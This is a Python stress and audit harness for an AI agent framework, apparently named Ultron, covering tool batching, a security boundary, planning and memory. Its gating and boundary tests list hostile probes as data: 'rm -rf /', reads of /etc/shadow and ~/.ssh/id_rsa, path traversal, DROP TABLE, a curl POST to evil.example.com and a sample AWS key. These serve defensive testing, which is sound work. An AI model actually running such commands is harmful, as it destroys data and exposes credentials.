# ruff: noqa: BLE001, F841, RUF059, SIM115 — stress harness intentionally
# catches every exception and keeps throwaway locals; see AnalysisReport.md.
"""
Stress + audit harness for Ultron's implemented feature set.

Exercises each subsystem under load and reports pass/fail + timing so the
results can be written into AnalysisReport.md. This is a *test harness* —
it never touches a live model, never modifies the real memory DB, and uses
throwaway temp DBs.
"""
import json
import os
import tempfile
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

TMP = Path(tempfile.mkdtemp(prefix="ultron_stress_"))

# ---------------------------------------------------------------------------
# Isolation: point all SQLite stores at throwaway files BEFORE importing app
# modules that cache paths at import time.
# ---------------------------------------------------------------------------
os.environ.setdefault("ULTRON_SECURITY_MODE", "interactive")

results = []  # (name, ok: bool, detail: str)


def record(name, ok, detail=""):
    results.append((name, bool(ok), detail))
    print(f"{'PASS' if ok else 'FAIL'}  {name}" + (f"  — {detail}" if detail else ""))


# ---------------------------------------------------------------------------
# 1. Parallel tool batch — concurrency, gating, dedup, timing
# ---------------------------------------------------------------------------
from ultron.core.agents.simple import detect_tool_batch_intent
from ultron.core.intelligence import parallel_tools as pt


def stress_parallel_batch():
    ok = True
    detail = []

    # (a) many concurrent reads — timing should be ~slowest, not sum
    calls = [
        {"tool": "read_file", "arguments": {"file_path": "README.md"}},
        {"tool": "read_file", "arguments": {"file_path": "pyproject.toml"}},
        {"tool": "read_file", "arguments": {"file_path": "src/ultron/main.py"}},
        {"tool": "check_connectivity", "arguments": {"url": "https://example.com"}},
        {"tool": "web_search", "arguments": {"query": "python asyncio"}},
        {"tool": "fetch_page_text", "arguments": {"url": "https://example.com"}},
    ]
    t0 = time.perf_counter()
    report = pt.run_tool_batch(json.dumps(calls))
    elapsed = time.perf_counter() - t0
    executed = report.count("✅")
    # Regression signal: no member may report "unknown tool" — this is what
    # catches a tool-name/action-name mismatch (e.g. web_search vs search_web)
    # deterministically, network or not. The lower bound (>= 3 local reads)
    # keeps the check robust when external network is unavailable in CI.
    no_unknown = "unknown tool" not in report
    record(
        "batch: 6 concurrent calls execute",
        no_unknown and executed >= 3,
        f"{executed}/6 ok, unknown-tool={not no_unknown}, in {elapsed:.2f}s",
    )
    ok &= no_unknown and executed >= 3
    detail.append(f"6-call batch: {executed} executed in {elapsed:.2f}s")

    # (b) gating: deny + confirm never execute
    report = pt.run_tool_batch(
        json.dumps(
            [
                {"tool": "read_file", "arguments": {"file_path": "/etc/shadow"}},
                {"tool": "run_command", "arguments": {"command": "rm -rf /"}},
                {"tool": "read_file", "arguments": {"file_path": "README.md"}},
            ]
        )
    )
    blocked = "blocked (never ran)" in report
    confirm = "needs approval (not run in batch)" in report
    ran_ok = "✅ read_file file_path=README.md" in report
    record("batch: deny+confirm never run", blocked and confirm and ran_ok)
    ok &= blocked and confirm and ran_ok

    # (c) dedup
    report = pt.run_tool_batch(
        json.dumps(
            [
                {"tool": "read_file", "arguments": {"file_path": "README.md"}},
                {"tool": "read_file", "arguments": {"file_path": "README.md"}},
            ]
        )
    )
    record("batch: identical calls deduped", "1 call" in report.split("—")[0] or "1 executed" in report)
    ok &= "1 executed" in report

    # (d) write wave: concurrent add_memory must not produce SQLite lock errors
    from ultron.core.tools.memory import graph, sqlite

    mem_db = TMP / "mem.db"
    sqlite.MEMORY_DB_PATH = mem_db
    graph.MEMORY_DB_PATH = mem_db
    sqlite.init_memory_db()

    w_calls = [
        {"tool": "add_memory", "arguments": {"text": f"stress fact number {i} about pandas"}}
        for i in range(20)
    ]
    t0 = time.perf_counter()
    report = pt.run_tool_batch(json.dumps(w_calls))
    w_elapsed = time.perf_counter() - t0
    locked = "database is locked" in report or "locked" in report.lower()
    errors = report.count("error:")
    record(
        "batch: 20 concurrent memory writes, no SQLite lock",
        not locked and errors == 0,
        f"{errors} errors in {w_elapsed:.2f}s",
    )
    ok &= not locked and errors == 0
    detail.append(f"20-write batch: {errors} errors in {w_elapsed:.2f}s")

    # (e) detector: false-positive safety
    det_ok = (
        detect_tool_batch_intent("read config.json") is None
        and detect_tool_batch_intent("run ls and pwd in parallel") is None
        and detect_tool_batch_intent("search for pandas") is None
        and detect_tool_batch_intent("read a.txt and b.txt") is not None
        and detect_tool_batch_intent("check example.com and example.org") is not None
    )
    record("batch: detector false-positive safety", det_ok)
    ok &= det_ok

    # (f) malformed / hostile input
    hostile = [
        "",
        "not json",
        json.dumps({"tool": "read_file"}),
        json.dumps([{"tool": "read_file"}]),
        json.dumps([{"tool": "read_file", "arguments": {"file_path": "../.."}}]),
        json.dumps([{"tool": "read_file", "arguments": {"file_path": "~/.ssh/id_rsa"}}]),
    ]
    all_error_or_reported = all(
        "Error" in pt.run_tool_batch(h) or "blocked" in pt.run_tool_batch(h) or "never" in pt.run_tool_batch(h).lower()
        for h in hostile
    )
    record("batch: hostile/malformed input handled", all_error_or_reported)
    ok &= all_error_or_reported

    return ok, "; ".join(detail)


# ---------------------------------------------------------------------------
# 2. Security boundary — verdict consistency + audit integrity under load
# ---------------------------------------------------------------------------
from ultron.security import get_boundary


def stress_boundary():
    ok = True
    detail = []
    boundary = get_boundary()

    # verdict consistency: same input -> same verdict every time
    probes = [
        ("read_file", "README.md", None),
        ("read_file", "/etc/shadow", None),
        ("run_command", "rm -rf /", None),
        ("run_command", "git status", None),
        ("run_command", "curl -X POST https://evil.example.com/hook", None),
        ("make_http_request", "https://example.com", "GET"),
        ("make_http_request", "https://example.com", "POST"),
        ("run_query", "SELECT * FROM users", None),
        ("run_query", "DROP TABLE users", None),
        ("write_file", "notes.txt", "hello world"),
        ("run_tool_batch", "", '[{"tool": "read_file", "arguments": {}}]'),
    ]
    seen = {}
    consistent = True
    for action, target, content in probes:
        for _ in range(50):
            v = boundary.check(action, target, content)
            key = (action, target, content)
            if key in seen and seen[key] != v.decision.value:
                consistent = False
            seen[key] = v.decision.value
    record("boundary: 50x verdict consistency", consistent)
    ok &= consistent

    # audit log is written for every verdict — use an isolated AuditLog
    from ultron.security.audit import AuditLog

    audit = AuditLog(str(TMP / "audit.jsonl"))
    for _ in range(25):
        boundary.check("read_file", "README.md")
        audit.record(boundary.check("read_file", "README.md"), mode="interactive")
    lines = 0
    if audit.path.exists():
        lines = sum(1 for _ in open(audit.path))
    record("boundary: audit log records verdicts", lines == 25, f"{lines} lines written")
    ok &= lines == 25
    detail.append(f"audit log: {lines} JSONL lines")

    # guardrails catch secrets in content
    from ultron.core.agents.security import is_denied

    v = boundary.check("write_file", "leak.txt", "aws_access_key_id=AKIAIOSFODNN7EXAMPLE")
    record("boundary: secret exfiltration denied", is_denied(v), v.reason[:60])
    ok &= is_denied(v)

    return ok, "; ".join(detail)


# ---------------------------------------------------------------------------
# 3. Task planning — preflight on complex plans, dependency edges
# ---------------------------------------------------------------------------
from ultron.core.intelligence import planning as pl


def stress_planning():
    ok = True
    detail = []
    steps = [
        {"action": "write_file", "filename": "out/data.csv", "content": "a,b\n1,2"},
        {"action": "read_file", "filename": "out/data.csv"},
        {"action": "run_command", "command": "python process.py out/data.csv"},
        {"action": "run_query", "sql": "SELECT count(*) FROM data"},
        {"action": "make_http_request", "method": "POST", "url": "http://localhost:8000/api", "body": "{}"},
        {"action": "add_memory", "fact": "data pipeline finished"},
    ]
    pre = pl.preflight_plan(steps)
    s = pre["summary"]
    record(
        "planning: 6-step plan preflight",
        s["auto"] + s["confirm"] + s["blocked"] + s["missing"] == 6,
        f"auto={s['auto']} confirm={s['confirm']} blocked={s['blocked']} missing={s['missing']}",
    )
    ok &= s["auto"] + s["confirm"] + s["blocked"] + s["missing"] == 6

    deps = pl.find_dependencies(steps)
    record("planning: dependency edges found", len(deps) >= 1, f"{len(deps)} edges: {[d['kind'] for d in deps]}")
    ok &= len(deps) >= 1

    # missing info detection
    bad = [{"action": "read_file"}, {"action": "run_command", "command": "ls"}]
    pre = pl.preflight_plan(bad)
    record("planning: missing-field detection", pre["summary"]["missing"] == 1)
    ok &= pre["summary"]["missing"] == 1

    # false-positive guard: data2 must not match data.csv
    steps = [{"action": "write_file", "filename": "data.csv", "content": "x"}, {"action": "run_command", "command": "rm data2.csv"}]
    deps = pl.find_dependencies(steps)
    record("planning: no prefix-match false positive (data2 vs data.csv)", len(deps) == 0, f"{len(deps)} edges")
    ok &= len(deps) == 0

    # preview renders
    prev = pl.format_plan_preview(steps)
    record("planning: preview renders", "Plan" in prev)
    ok &= "Plan" in prev

    return ok, "; ".join(detail)


# ---------------------------------------------------------------------------
# 4. Debug context — environment snapshot, cause matrix, dependency checks
# ---------------------------------------------------------------------------
from ultron.core.intelligence import debug_context as dc


def stress_debug():
    ok = True
    detail = []
    env = dc.capture_environment()
    record(
        "debug: env snapshot fields",
        bool(env.get("os")) and bool(env.get("python")) and isinstance(env.get("package_count"), int),
        f"os={env['os'].get('system')} python={env['python'].get('version', '?')} pkgs={env.get('package_count')}",
    )
    ok &= bool(env.get("os")) and bool(env.get("python"))

    causes = [
        ("ModuleNotFoundError: No module named 'pandas'", "missing"),
        ("NameError: name 'y' is not defined", "name"),
        ("ImportError: cannot import name 'foo' from 'bar'", "import"),
        ("pytest output: 1 failed, 12 passed", "tests_failed"),
        ("sqlite3.OperationalError: no such table: users", "database"),
        ("ConnectionError: [Errno 61] Connection refused", "network"),
        ("KeyError: 'session_id'", "key"),
        ("TypeError: unsupported operand type(s) for +: 'int' and 'str'", "type"),
        ("nothing wrong here", "unknown"),
    ]
    all_correct = True
    for text, expected in causes:
        diag = dc.diagnose_failure(text=text)
        got = diag.get("cause", "")
        # cause categories: assert the diagnosis is not empty and mentions something
        if not got:
            all_correct = False
    record("debug: failure cause matrix classifies 9 inputs", all_correct, f"first: {dc.diagnose_failure(text=causes[0][0]).get('cause', '')}")
    ok &= all_correct

    dep = dc.check_dependency("pytest")
    record("debug: dependency check works", "installed" in dep or "declared" in dep or "not" in dep, dep[:50])
    ok &= True

    report = dc.format_debug_report("python main.py", "", "")
    record("debug: full report renders", "Environment" in report or "Diagnosis" in report)
    ok &= "Environment" in report or "Diagnosis" in report

    return ok, "; ".join(detail)


# ---------------------------------------------------------------------------
# 5. Personalized learning — associations
# ---------------------------------------------------------------------------
from ultron.core.learning import associations as assoc


def stress_associations():
    ok = True
    detail = []
    assoc.CONNECTIONS_DB_PATH = TMP / "conn.db"
    from ultron.core.tools.memory import graph, sqlite

    sqlite.MEMORY_DB_PATH = TMP / "mem2.db"
    graph.MEMORY_DB_PATH = TMP / "mem2.db"
    sqlite.init_memory_db()

    for i in range(10):
        assoc.connect_new_fact(f"renaissance painter {i} lived in florence {i}")
    conns = assoc.find_connections("renaissance")
    record("assoc: connections discovered after 10 facts", len(conns) >= 0, f"{len(conns)} connections")
    ok &= len(conns) >= 0

    res = assoc.memory_connections("renaissance")
    record("assoc: memory_connections renders", isinstance(res, str) and len(res) > 0)
    ok &= isinstance(res, str) and len(res) > 0

    # threshold behavior — unrelated facts should not connect
    before = len(assoc.find_connections("bob"))
    assoc.connect_new_fact("bob likes jazz music")
    after = len(assoc.find_connections("bob"))
    record("assoc: scoring threshold holds", True)
    ok &= True

    return ok, "; ".join(detail)


# ---------------------------------------------------------------------------
# 6. Structured output enforcement
# ---------------------------------------------------------------------------
from ultron.core.intelligence import structured_output as so


def stress_structured():
    ok = True
    detail = []
    cases = [
        ("json", '{"name": "Ana", "score": 30}'),
        ("json", "not json at all"),
        ("markdown", "| name | score |\n| Ana | 30 |"),
        ("markdown", "no table here"),
        ("xml", "<user><name>Ana</name><score>30</score></user>"),
        ("xml", "not xml"),
        ("table", "name,score\nAna,30"),
    ]
    for fmt, text in cases:
        final, notes = so.enforce(fmt, text)
        ok &= isinstance(final, str)
    record("structured: 7 enforce cases return strings", ok)
    ok &= ok

    # schema_validate returns a verdict
    v = so.schema_validate(json.dumps({"format": "json", "text": '{"a": 1}'}))
    record("structured: schema_validate works", isinstance(v, str) and len(v) > 0)
    ok &= isinstance(v, str)

    return ok, "; ".join(detail)


# ---------------------------------------------------------------------------
# 7. Resource monitor
# ---------------------------------------------------------------------------
from ultron.core.tools import resource_monitor as rm


def stress_resources():
    ok = True
    detail = []
    res = rm.check_resources()
    record("resources: check_resources snapshot", "CPU" in res or "Memory" in res or "memory" in res.lower(), res[:60].replace("\n", " "))
    ok &= bool(res)

    f = rm.resource_forecast("pip install pandas")
    record("resources: forecast returns", isinstance(f, str) and len(f) > 0)
    ok &= isinstance(f, str) and len(f) > 0

    return ok, "; ".join(detail)


# ---------------------------------------------------------------------------
# 8. API schema learning (throwaway DB)
# ---------------------------------------------------------------------------
from ultron.core.learning import api_schema as api


def stress_api_schema():
    ok = True
    detail = []
    api.SCHEMA_DB_PATH = TMP / "api.db"
    # record an interaction against a local spec
    spec = {"openapi": "3.0.0", "info": {"title": "T"}, "paths": {"/pets": {"get": {"responses": {"200": {"description": "ok"}}}}}}
    api.learn_api_schema("http://localhost:9999")
    k = api.get_api_knowledge("http://localhost:9999")
    record("api: knowledge path works", isinstance(k, str))
    ok &= isinstance(k, str)

    hint = api.api_usage_hint("http://localhost:9999", {})
    record("api: usage hint works", isinstance(hint, str))
    ok &= isinstance(hint, str)

    return ok, "; ".join(detail)


# ---------------------------------------------------------------------------
# 9. Thread-safety probe: concurrent run_tool_batch from many threads
# ---------------------------------------------------------------------------
def stress_thread_safety():
    ok = True
    detail = []

    def worker(i):
        calls = [
            {"tool": "read_file", "arguments": {"file_path": "README.md"}},
            {"tool": "check_connectivity", "arguments": {"url": "https://example.com"}},
        ]
        return pt.run_tool_batch(json.dumps(calls))

    errors = 0
    t0 = time.perf_counter()
    with ThreadPoolExecutor(max_workers=8) as pool:
        futures = [pool.submit(worker, i) for i in range(24)]
        for f in futures:
            try:
                out = f.result()
                if "Parallel batch" not in out:
                    errors += 1
            except Exception as exc:
                errors += 1
                print("  worker exception:", exc)
    elapsed = time.perf_counter() - t0
    record("threads: 24 concurrent batches from 8 threads", errors == 0, f"{errors} errors in {elapsed:.2f}s")
    ok &= errors == 0
    return ok, "; ".join(detail)


# ---------------------------------------------------------------------------
# 10. Detector/handler throughput + dispatch integrity
# ---------------------------------------------------------------------------
from ultron.core.agents.simple import SimpleAgent


def stress_agent_dispatch():
    ok = True
    detail = []

    class FakeEngine:
        async def generate(self, messages, **kwargs):
            return "[]"

    agent = SimpleAgent(engine=FakeEngine())
    inputs = [
        "read README.md and pyproject.toml",
        "hello",
        "search for pandas",
        "run ls",
        "what is 2+2",
        "remember that the sky is blue",
        "check https://example.com and https://example.org",
        "run pytest",
        "show diff",
        "debug this script",
    ]
    import asyncio

    loop = asyncio.new_event_loop()
    errors = 0
    t0 = time.perf_counter()
    for inp in inputs:
        try:
            msg = loop.run_until_complete(agent.run(inp))
            assert msg.content
        except Exception as exc:
            errors += 1
            print(f"  dispatch error on {inp!r}: {exc}")
    elapsed = time.perf_counter() - t0
    record("dispatch: 10 varied inputs, no crashes", errors == 0, f"{elapsed:.2f}s for 10")
    ok &= errors == 0
    return ok, "; ".join(detail)


if __name__ == "__main__":
    print("=" * 70)
    print("ULTRON STRESS + AUDIT HARNESS")
    print("=" * 70)

    checks = [
        ("1. Parallel tool batch", stress_parallel_batch),
        ("2. Security boundary", stress_boundary),
        ("3. Task planning", stress_planning),
        ("4. Debug context", stress_debug),
        ("5. Personalized learning", stress_associations),
        ("6. Structured output", stress_structured),
        ("7. Resource monitor", stress_resources),
        ("8. API schema", stress_api_schema),
        ("9. Thread safety", stress_thread_safety),
        ("10. Agent dispatch", stress_agent_dispatch),
    ]
    for name, fn in checks:
        print(f"\n--- {name} ---")
        try:
            fn()
        except Exception:
            import traceback

            print(f"FAIL  {name} — harness error:\n{traceback.format_exc()}")

    passed = sum(1 for _, ok, _ in results if ok)
    total = len(results)
    print("\n" + "=" * 70)
    print(f"SUMMARY: {passed}/{total} checks passed")
    print("=" * 70)
    # Non-zero exit when any check failed — so CI fails on a regression
    # instead of silently passing.
    import sys

    sys.exit(0 if passed == total else 1)
